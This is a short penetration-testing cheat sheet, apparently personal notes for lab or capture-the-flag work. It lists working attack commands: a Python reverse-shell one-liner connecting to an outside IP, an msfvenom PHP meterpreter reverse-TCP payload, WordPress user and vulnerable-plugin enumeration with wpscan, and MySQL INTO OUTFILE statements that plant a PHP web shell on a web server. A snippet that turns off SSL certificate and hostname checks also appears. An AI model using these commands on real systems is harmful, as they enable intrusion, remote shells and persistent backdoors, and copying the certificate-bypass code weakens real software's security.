#Privilege Escalation
	1. uname -a
	2. cat /etc/*release*
	3. cat /etc/lsb-release

#Bash shells
	1. /usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'
	
	
#Bind Shells



#Reverse Shells
	1. Python shell
		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#Reverse Shells using metasploit

  	1. msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=1337 -e php/base64 > shell.php
     		 
		 append <?php ?> in the shell.php file

#Wordpress Scanning
	1. wpscan --url https://10.0.2.9:12038/blogblog --enumerate uvp
	2. wpscan --url https://10.0.2.9:12038/blogblog --enumerate ap
	
    		u : enumerate usernames 
    		vp : vulnerable plugins
		p : plugins
		ap : all plugins
    
#Changing a python urllib2.urlopen method to work with ssl

	1. 
		import ssl 
		ctx = ssl.create_default_context()
		ctx.check_hostname = False
		ctx.verify_mode = ssl.CERT_NONE

		urllib2.urlopen(----- , context = ctx)

#After getting access to mysql command line remotely

	1. Creating a file onto the remote server
		mysql> select "baba" into outfile "/var/www/html/somepath/wp-content/uploads/test.txt";
		mysql> select "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/somepath/shell.php"
    
